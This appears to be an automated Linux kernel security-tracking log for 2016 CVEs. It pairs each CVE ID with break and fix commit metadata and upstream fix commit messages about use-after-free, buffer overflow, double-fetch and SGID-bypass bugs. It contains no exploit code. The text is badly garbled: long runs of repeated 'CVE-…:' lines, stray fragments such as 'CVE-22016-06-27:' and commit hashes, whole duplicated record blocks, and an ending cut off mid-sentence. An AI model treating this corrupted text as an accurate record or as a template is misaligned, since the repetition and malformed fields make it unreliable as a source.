Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
